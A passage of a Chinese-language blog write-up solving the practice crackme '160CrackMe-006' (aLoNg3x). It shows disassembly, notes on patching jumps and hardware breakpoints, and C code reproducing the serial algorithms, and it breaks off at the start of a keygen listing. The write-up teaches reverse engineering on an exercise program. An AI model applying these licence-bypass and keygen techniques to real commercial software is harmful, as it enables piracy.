class="hljs-number">33</span>C<span class="hljs-number">0</span>          xor eax,eax<br><span class="hljs-attribute">00442D32</span>  |.  <span class="hljs-number">5</span>A            pop edx                                  ;  aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">0041</span>E<span class="hljs-number">13</span>E<br><span class="hljs-attribute">00442D33</span>  |.  <span class="hljs-number">59</span>            pop ecx                                  ;  aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">0041</span>E<span class="hljs-number">13</span>E<br><span class="hljs-attribute">00442D34</span>  |.  <span class="hljs-number">59</span>            pop ecx                                  ;  aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">0041</span>E<span class="hljs-number">13</span>E<br><span class="hljs-attribute">00442D35</span>  |.  <span class="hljs-number">64</span>:<span class="hljs-number">8910</span>       mov dword ptr fs:[eax],edx<br><span class="hljs-attribute">00442D38</span>  |.  <span class="hljs-number">68</span> <span class="hljs-number">5</span>D<span class="hljs-number">2</span>D<span class="hljs-number">4400</span>   push aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>D<span class="hljs-number">5</span>D<br><span class="hljs-attribute">00442D3D</span>  |&gt;  <span class="hljs-number">8</span>D<span class="hljs-number">45</span> F<span class="hljs-number">0</span>       lea eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">10</span>]<br><span class="hljs-attribute">00442D40</span>  |.  E<span class="hljs-number">8</span> <span class="hljs-number">730</span>AFCFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">004037</span>B<span class="hljs-number">8</span><br><span class="hljs-attribute">00442D45</span>  |.  <span class="hljs-number">8</span>D<span class="hljs-number">45</span> F<span class="hljs-number">4</span>       lea eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>xC]<br><span class="hljs-attribute">00442D48</span>  |.  E<span class="hljs-number">8</span> <span class="hljs-number">6</span>B<span class="hljs-number">0</span>AFCFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">004037</span>B<span class="hljs-number">8</span><br><span class="hljs-attribute">00442D4D</span>  |.  <span class="hljs-number">8</span>D<span class="hljs-number">45</span> F<span class="hljs-number">8</span>       lea eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">8</span>]<br><span class="hljs-attribute">00442D50</span>  |.  E<span class="hljs-number">8</span> <span class="hljs-number">630</span>AFCFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">004037</span>B<span class="hljs-number">8</span><br><span class="hljs-attribute">00442D55</span>  \.  C<span class="hljs-number">3</span>            retn<br></code></pre></div></td></tr></table></figure><p>尝试在eax+0x47这下硬件写入断点，发现并不能断下来，说明还是没有满足某个条件。</p><p>看第二个关键函数，可以看到一个计算，通过用户名算出serial，懒得再解释了QAQ，直接看下面代码吧。</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">00442A8E</span>  |.  B<span class="hljs-number">8</span> <span class="hljs-number">01000000</span>   mov eax,<span class="hljs-number">0</span>x<span class="hljs-number">1</span><br><span class="hljs-attribute">00442A93</span>  |&gt;  <span class="hljs-number">8</span>B<span class="hljs-number">4</span>D FC       /mov ecx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">4</span>]          ;  user<span class="hljs-number">32</span>.<span class="hljs-number">75</span>B<span class="hljs-number">17276</span><br><span class="hljs-attribute">00442A96</span>  |.  <span class="hljs-number">0</span>FB<span class="hljs-number">64</span>C<span class="hljs-number">01</span> FF   |movzx ecx,byte ptr ds:[ecx+eax-<span class="hljs-number">0</span>x<span class="hljs-number">1</span>]<br><span class="hljs-attribute">00442A9B</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">75</span> FC       |mov esi,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">4</span>]          ;  user<span class="hljs-number">32</span>.<span class="hljs-number">75</span>B<span class="hljs-number">17276</span><br><span class="hljs-attribute">00442A9E</span>  |.  <span class="hljs-number">0</span>FB<span class="hljs-number">63406</span>      |movzx esi,byte ptr ds:[esi+eax]<br><span class="hljs-attribute">00442AA2</span>  |.  <span class="hljs-number">0</span>FAFCE        |imul ecx,esi<br><span class="hljs-attribute">00442AA5</span>  |.  <span class="hljs-number">0</span>FAFC<span class="hljs-number">8</span>        |imul ecx,eax<br><span class="hljs-attribute">00442AA8</span>  |.  <span class="hljs-number">03</span>D<span class="hljs-number">9</span>          |add ebx,ecx<br><span class="hljs-attribute">00442AAA</span>  |.  <span class="hljs-number">40</span>            |inc eax<br><span class="hljs-attribute">00442AAB</span>  |.  <span class="hljs-number">4</span>A            |dec edx<br><span class="hljs-attribute">00442AAC</span>  |.^ <span class="hljs-number">75</span> E<span class="hljs-number">5</span>         \jnz short aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>A<span class="hljs-number">93</span><br><span class="hljs-attribute">00442AAE</span>  |&gt;  <span class="hljs-number">8</span>B<span class="hljs-number">45</span> F<span class="hljs-number">8</span>       mov eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">8</span>]<br><span class="hljs-attribute">00442AB1</span>  |.  E<span class="hljs-number">8</span> BA<span class="hljs-number">4</span>BFCFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00407670</span><br><span class="hljs-attribute">00442AB6</span>  |.  <span class="hljs-number">2</span>BD<span class="hljs-number">8</span>          sub ebx,eax<br><span class="hljs-attribute">00442AB8</span>  |.  <span class="hljs-number">81</span>FB <span class="hljs-number">9</span>A<span class="hljs-number">020000</span> cmp ebx,<span class="hljs-number">0</span>x<span class="hljs-number">29</span>A<br><span class="hljs-attribute">00442ABE</span>  |.  <span class="hljs-number">75</span> <span class="hljs-number">04</span>         jnz short aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>AC<span class="hljs-number">4</span><br></code></pre></div></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">int</span> len = <span class="hljs-built_in">strlen</span>(szname);<br><span class="hljs-keyword">int</span> sum = len;<br><span class="hljs-keyword">int</span> temp = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; len - <span class="hljs-number">1</span>; i++) &#123;<br>sum = ((szname[i] * szname[i + <span class="hljs-number">1</span>]) * temp) + sum;<br>temp++;<br>&#125;<br><span class="hljs-keyword">int</span> serial;<br>serial = sum - <span class="hljs-number">0x29A</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, serial);<br></code></pre></div></td></tr></table></figure><p><img src="/2021/08/02/160CrackMe-006/5.png"></p><p>输入发现OK按钮已经亮了</p><p><img src="/2021/08/02/160CrackMe-006/6.png"></p><p>点击OK按钮发现，没有用，codice清0，然后OK又灰色了。</p><p><img src="/2021/08/02/160CrackMe-006/7.png"></p><p>从OK按钮入手，发现刚进来的第一个跳转就是熟悉的判断条件，说明程序并不是直接点击OK的，在这之前肯定还有一个条件要满足的。先继续在这里看一下，修改这个条件往下走，可以看到第二个跳转，修改这个跳转，按钮就会小时，经过分析之前这个函数就是算法。</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">00442D64</span>  /.  <span class="hljs-number">55</span>            push ebp<br><span class="hljs-attribute">00442D65</span>  |.  <span class="hljs-number">8</span>BEC          mov ebp,esp<br><span class="hljs-attribute">00442D67</span>  |.  <span class="hljs-number">6</span>A <span class="hljs-number">00</span>         push <span class="hljs-number">0</span>x<span class="hljs-number">0</span><br><span class="hljs-attribute">00442D69</span>  |.  <span class="hljs-number">53</span>            push ebx<br><span class="hljs-attribute">00442D6A</span>  |.  <span class="hljs-number">8</span>BD<span class="hljs-number">8</span>          mov ebx,eax<br><span class="hljs-attribute">00442D6C</span>  |.  <span class="hljs-number">33</span>C<span class="hljs-number">0</span>          xor eax,eax<br><span class="hljs-attribute">00442D6E</span>  |.  <span class="hljs-number">55</span>            push ebp<br><span class="hljs-attribute">00442D6F</span>  |.  <span class="hljs-number">68</span> ED<span class="hljs-number">2</span>D<span class="hljs-number">4400</span>   push aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>DED<br><span class="hljs-attribute">00442D74</span>  |.  <span class="hljs-number">64</span>:FF<span class="hljs-number">30</span>       push dword ptr fs:[eax]<br><span class="hljs-attribute">00442D77</span>  |.  <span class="hljs-number">64</span>:<span class="hljs-number">8920</span>       mov dword ptr fs:[eax],esp<br><span class="hljs-attribute">00442D7A</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">83</span> D<span class="hljs-number">0020000</span> mov eax,dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">2</span>D<span class="hljs-number">0</span>]<br><span class="hljs-attribute">00442D80</span>  |.  <span class="hljs-number">8078</span> <span class="hljs-number">47</span> <span class="hljs-number">01</span>    cmp byte ptr ds:[eax+<span class="hljs-number">0</span>x<span class="hljs-number">47</span>],<span class="hljs-number">0</span>x<span class="hljs-number">1</span>           ;  熟悉的地址<br><span class="hljs-attribute">00442D84</span>  |.  <span class="hljs-number">75</span> <span class="hljs-number">12</span>         jnz short aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>D<span class="hljs-number">98</span><br><span class="hljs-attribute">00442D86</span>  |.  BA <span class="hljs-number">002</span>E<span class="hljs-number">4400</span>   mov edx,aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>E<span class="hljs-number">00</span>                ;  UNICODE <span class="hljs-string">&quot;0&quot;</span><br><span class="hljs-attribute">00442D8B</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">83</span> E<span class="hljs-number">0020000</span> mov eax,dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">2</span>E<span class="hljs-number">0</span>]<br><span class="hljs-attribute">00442D91</span>  |.  E<span class="hljs-number">8</span> <span class="hljs-number">5</span>A<span class="hljs-number">05</span>FEFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">004232</span>F<span class="hljs-number">0</span><br><span class="hljs-attribute">00442D96</span>  |.  EB <span class="hljs-number">3</span>F         jmp short aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>DD<span class="hljs-number">7</span><br><span class="hljs-attribute">00442D98</span>  |&gt;  <span class="hljs-number">8</span>D<span class="hljs-number">55</span> FC       lea edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">4</span>]<br><span class="hljs-attribute">00442D9B</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">83</span> E<span class="hljs-number">0020000</span> mov eax,dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">2</span>E<span class="hljs-number">0</span>]<br><span class="hljs-attribute">00442DA1</span>  |.  E<span class="hljs-number">8</span> <span class="hljs-number">1</span>A<span class="hljs-number">05</span>FEFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">004232</span>C<span class="hljs-number">0</span><br><span class="hljs-attribute">00442DA6</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">45</span> FC       mov eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">4</span>]<br><span class="hljs-attribute">00442DA9</span>  |.  E<span class="hljs-number">8</span> C<span class="hljs-number">248</span>FCFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00407670</span><br><span class="hljs-attribute">00442DAE</span>  |.  <span class="hljs-number">50</span>            push eax<br><span class="hljs-attribute">00442DAF</span>  |.  <span class="hljs-number">8</span>D<span class="hljs-number">55</span> FC       lea edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">4</span>]<br><span class="hljs-attribute">00442DB2</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">83</span> DC<span class="hljs-number">020000</span> mov eax,dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">2</span>DC]<br><span class="hljs-attribute">00442DB8</span>  |.  E<span class="hljs-number">8</span> <span class="hljs-number">0305</span>FEFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">004232</span>C<span class="hljs-number">0</span><br><span class="hljs-attribute">00442DBD</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">45</span> FC       mov eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">4</span>]<br><span class="hljs-attribute">00442DC0</span>  |.  <span class="hljs-number">5</span>A            pop edx                                  ;  <span class="hljs-number">0018</span>F<span class="hljs-number">8</span>D<span class="hljs-number">4</span><br><span class="hljs-attribute">00442DC1</span>  |.  E<span class="hljs-number">8</span> DAFDFFFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>BA<span class="hljs-number">0</span>                   ;  算法<br><span class="hljs-attribute">00442DC6</span>  |.  <span class="hljs-number">84</span>C<span class="hljs-number">0</span>          test al,al<br><span class="hljs-attribute">00442DC8</span>  |.  <span class="hljs-number">74</span> <span class="hljs-number">0</span>D         je short aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>DD<span class="hljs-number">7</span><br><span class="hljs-attribute">00442DCA</span>  |.  <span class="hljs-number">33</span>D<span class="hljs-number">2</span>          xor edx,edx<br><span class="hljs-attribute">00442DCC</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">83</span> CC<span class="hljs-number">020000</span> mov eax,dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">2</span>CC]<br><span class="hljs-attribute">00442DD2</span>  |.  E<span class="hljs-number">8</span> D<span class="hljs-number">903</span>FEFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">004231</span>B<span class="hljs-number">0</span><br><span class="hljs-attribute">00442DD7</span>  |&gt;  <span class="hljs-number">33</span>C<span class="hljs-number">0</span>          xor eax,eax<br><span class="hljs-attribute">00442DD9</span>  |.  <span class="hljs-number">5</span>A            pop edx                                  ;  <span class="hljs-number">0018</span>F<span class="hljs-number">8</span>D<span class="hljs-number">4</span><br><span class="hljs-attribute">00442DDA</span>  |.  <span class="hljs-number">59</span>            pop ecx                                  ;  <span class="hljs-number">0018</span>F<span class="hljs-number">8</span>D<span class="hljs-number">4</span><br><span class="hljs-attribute">00442DDB</span>  |.  <span class="hljs-number">59</span>            pop ecx                                  ;  <span class="hljs-number">0018</span>F<span class="hljs-number">8</span>D<span class="hljs-number">4</span><br><span class="hljs-attribute">00442DDC</span>  |.  <span class="hljs-number">64</span>:<span class="hljs-number">8910</span>       mov dword ptr fs:[eax],edx<br><span class="hljs-attribute">00442DDF</span>  |.  <span class="hljs-number">68</span> F<span class="hljs-number">42</span>D<span class="hljs-number">4400</span>   push aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>DF<span class="hljs-number">4</span><br><span class="hljs-attribute">00442DE4</span>  |&gt;  <span class="hljs-number">8</span>D<span class="hljs-number">45</span> FC       lea eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">4</span>]<br><span class="hljs-attribute">00442DE7</span>  |.  E<span class="hljs-number">8</span> CC<span class="hljs-number">09</span>FCFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">004037</span>B<span class="hljs-number">8</span><br><span class="hljs-attribute">00442DEC</span>  \.  C<span class="hljs-number">3</span>            retn<br></code></pre></div></td></tr></table></figure><p>进入算法进行查看，可以看到一个通过注册码求用户名的过程。</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">00442C09</span>  |.  <span class="hljs-number">0</span>FB<span class="hljs-number">64430</span> FF   |movzx eax,byte ptr ds:[eax+esi-<span class="hljs-number">0</span>x<span class="hljs-number">1</span>]     ;  获取最后一位<br><span class="hljs-attribute">00442C0E</span>  |.  F<span class="hljs-number">7</span>E<span class="hljs-number">8</span>          |imul eax                                ;  平方<br><span class="hljs-attribute">00442C10</span>  |.  <span class="hljs-number">0</span>FBFC<span class="hljs-number">0</span>        |movsx eax,ax<br><span class="hljs-attribute">00442C13</span>  |.  F<span class="hljs-number">7</span>EE          |imul esi                                ;  乘以长度/长度不断-<span class="hljs-number">1</span><br><span class="hljs-attribute">00442C15</span>  |.  B<span class="hljs-number">9</span> <span class="hljs-number">19000000</span>   |mov ecx,<span class="hljs-number">0</span>x<span class="hljs-number">19</span><br><span class="hljs-attribute">00442C1A</span>  |.  <span class="hljs-number">99</span>            |cdq<br><span class="hljs-attribute">00442C1B</span>  |.  F<span class="hljs-number">7</span>F<span class="hljs-number">9</span>          |idiv ecx<br><span class="hljs-attribute">00442C1D</span>  |.  <span class="hljs-number">83</span>C<span class="hljs-number">2</span> <span class="hljs-number">41</span>       |add edx,<span class="hljs-number">0</span>x<span class="hljs-number">41</span>                            ;  除以<span class="hljs-number">0</span>x<span class="hljs-number">19</span>余数+<span class="hljs-number">0</span>x<span class="hljs-number">41</span><br><span class="hljs-attribute">00442C20</span>  |.  <span class="hljs-number">58</span>            |pop eax                                 ;  <span class="hljs-number">0018</span>F<span class="hljs-number">8</span>D<span class="hljs-number">4</span><br><span class="hljs-attribute">00442C21</span>  |.  <span class="hljs-number">8810</span>          |mov byte ptr ds:[eax],dl<br><span class="hljs-attribute">00442C23</span>  |.  <span class="hljs-number">4</span>E            |dec esi<br><span class="hljs-attribute">00442C24</span>  |.  <span class="hljs-number">85</span>F<span class="hljs-number">6</span>          |test esi,esi<br><span class="hljs-attribute">00442C26</span>  |.^ <span class="hljs-number">75</span> D<span class="hljs-number">1</span>         \jnz short aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>BF<span class="hljs-number">9</span><br><span class="hljs-attribute">00442C28</span>  |&gt;  <span class="hljs-number">8</span>B<span class="hljs-number">45</span> F<span class="hljs-number">4</span>       mov eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>xC]<br><span class="hljs-attribute">00442C2B</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">55</span> FC       mov edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">4</span>]<br><span class="hljs-attribute">00442C2E</span>  |.  E<span class="hljs-number">8</span> <span class="hljs-number">110</span>FFCFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00403</span>B<span class="hljs-number">44</span>                   ;  与输入的用户名进行比较<br><span class="hljs-attribute">00442C33</span>  |.  <span class="hljs-number">75</span> <span class="hljs-number">17</span>         jnz short aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>C<span class="hljs-number">4</span>C<br></code></pre></div></td></tr></table></figure><p>代码如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">char</span> name[<span class="hljs-number">20</span>];<br>itoa(serial, name,<span class="hljs-number">10</span>);<br><span class="hljs-keyword">int</span> len = <span class="hljs-built_in">strlen</span>(name);<br><span class="hljs-keyword">int</span> a = len;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br><span class="hljs-keyword">int</span> temp = name[a<span class="hljs-number">-1</span>] * name[a<span class="hljs-number">-1</span>];<br>temp = temp *  a;<br>temp = temp % <span class="hljs-number">0x19</span>;<br>temp = temp + <span class="hljs-number">0x41</span>;<br>name[a - <span class="hljs-number">1</span>] = temp;<br>a = a -  <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, name);<br></code></pre></div></td></tr></table></figure><p>现在就剩下最后一个事件，CancellaClick</p><p>进去查看，发现里面没有那个熟悉的地址，那么基本上那个地址的赋值应该就是在这里了吧，只有一个跳转，修改条件后，最早下的硬件断点终于断下来了。那么查看一下算法的过程。</p><p><img src="/2021/08/02/160CrackMe-006/8.png"></p><p>进入函数查看，可以看到具体的算法，是一个通过用户名求注册码的过程。</p><figure class="highlight maxima"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs maxima"><span class="hljs-number">00442B20</span>  |.  83F8 <span class="hljs-number">05</span>       cmp eax,<span class="hljs-number">0x5</span>                              ;  判断输入的name是否大于<span class="hljs-number">5</span><br><span class="hljs-number">00442B23</span>  |.  7E <span class="hljs-number">53</span>         jle short aLoNg3x_<span class="hljs-number">.00442B78</span><br><span class="hljs-number">00442B25</span>  |.  <span class="hljs-number">8B45</span> FC       mov eax,dword ptr ss:[ebp-<span class="hljs-number">0x4</span>]<br><span class="hljs-number">00442B28</span>  |.  <span class="hljs-number">0FB640</span> <span class="hljs-number">04</span>     movzx eax,byte ptr ds:[eax+<span class="hljs-number">0x4</span>]          ;  获取name第五位<br><span class="hljs-number">00442B2C</span>  |.  B9 <span class="hljs-number">07000000</span>   mov ecx,<span class="hljs-number">0x7</span><br><span class="hljs-number">00442B31</span>  |.  33D2          xor edx,edx<br><span class="hljs-number">00442B33</span>  |.  F7F1          div ecx                                  ;  除以<span class="hljs-number">7</span><br><span class="hljs-number">00442B35</span>  |.  8BC2          mov eax,edx                              ;  余数<br><span class="hljs-number">00442B37</span>  |.  83C0 <span class="hljs-number">02</span>       add eax,<span class="hljs-number">0x2</span><br><span class="hljs-number">00442B3A</span>  |.  E8 E1FEFFFF   call aLoNg3x_.<span class="hljs-number">00442A20</span>                   ;  阶乘<br><span class="hljs-number">00442B3F</span>  |.  8BF0          mov esi,eax<br><span class="hljs-number">00442B41</span>  |.  33DB          xor ebx,ebx<br><span class="hljs-number">00442B43</span>  |.  <span class="hljs-number">8B45</span> FC       mov eax,dword ptr ss:[ebp-<span class="hljs-number">0x4</span>]<br><span class="hljs-number">00442B46</span>  |.  E8 E90EFCFF   call aLoNg3x_.<span class="hljs-number">00403A34</span><br><span class="hljs-number">00442B4B</span>  |.  85C0          test eax,eax<br><span class="hljs-number">00442B4D</span>  |.  7E <span class="hljs-number">16</span>         jle short aLoNg3x_<span class="hljs-number">.00442B65</span><br><span class="hljs-number">00442B4F</span>  |.  BA <span class="hljs-number">01000000</span>   mov edx,<span class="hljs-number">0x1</span><br><span class="hljs-number">00442B54</span>  |&gt;  8B4D FC       /mov ecx,dword ptr ss:[ebp-<span class="hljs-number">0x4</span>]<br><span class="hljs-number">00442B57</span>  |.  <span class="hljs-number">0FB64C11</span> FF   |movzx ecx,byte ptr ds:[ecx+edx-<span class="hljs-number">0x1</span>]     ;  逐位获取<br><span class="hljs-number">00442B5C</span>  |.  <span class="hljs-number">0FAFCE</span>        |imul ecx,esi<br><span class="hljs-number">00442B5F</span>  |.  <span class="hljs-number">03D9</span>          |add ebx,ecx                             ;  user32.75B16D51<br><span class="hljs-number">00442B61</span>  |.  <span class="hljs-number">42</span>            |inc edx<br><span class="hljs-number">00442B62</span>  |.  <span class="hljs-number">48</span>            |dec eax<br><span class="hljs-number">00442B63</span>  |.^ <span class="hljs-number">75</span> EF         \jnz short aLoNg3x_<span class="hljs-number">.00442B54</span><br><span class="hljs-number">00442B65</span>  |&gt;  2B5D F8       sub ebx,dword ptr ss:[ebp-<span class="hljs-number">0x8</span>]           ;  减去注册码十六进制<br><span class="hljs-number">00442B68</span>  |.  81FB 697A0000 cmp ebx,<span class="hljs-number">0x7A69</span><br><span class="hljs-number">00442B6E</span>  |.  <span class="hljs-number">75</span> <span class="hljs-number">04</span>         jnz short aLoNg3x_<span class="hljs-number">.00442B74</span><br><span class="hljs-number">00442B70</span>  |.  B3 <span class="hljs-number">01</span>         mov bl,<span class="hljs-number">0x1</span>                               ;  关键的赋值<br><span class="hljs-number">00442B72</span>  |.  EB <span class="hljs-number">06</span>         jmp short aLoNg3x_.<span class="hljs-number">00442B7A</span><br><span class="hljs-number">00442B74</span>  |&gt;  33DB          xor ebx,ebx<br><span class="hljs-number">00442B76</span>  |.  EB <span class="hljs-number">02</span>         jmp short aLoNg3x_.<span class="hljs-number">00442B7A</span><br></code></pre></div></td></tr></table></figure><p>代码如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">int</span> a = szname[<span class="hljs-number">4</span>] % <span class="hljs-number">0x7</span>;<br>a = a + <span class="hljs-number">2</span>;<br><span class="hljs-keyword">int</span> num = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= a; i++) &#123;<br>num = num * i;<br>&#125;<br><span class="hljs-keyword">int</span> len = <span class="hljs-built_in">strlen</span>(szname);<br><span class="hljs-keyword">int</span> sum = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br>sum += szname[i] * num;<br>&#125;<br><span class="hljs-keyword">int</span> serial;<br>serial = sum - <span class="hljs-number">0x7A69</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, serial);<br><span class="hljs-keyword">return</span> serial;<br></code></pre></div></td></tr></table></figure><p>当经过了这个判断之后，那个地址就会被赋值，同时cancle按钮也会消失，ok按钮会常亮。</p><p><img src="/2021/08/02/160CrackMe-006/9.png"></p><p>那么整体的流程就很清楚，首先要通过用户名计算一个注册码输入cancle按钮消失，ok变亮，然后再通过注册码计算出一个用户名输入后，ok消失，完成注册</p><h4 id="注册机编写"><a href="#注册机编写" class="headerlink" title="注册机编写"></a>注册机编写</h4><p>完整注册机代码如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 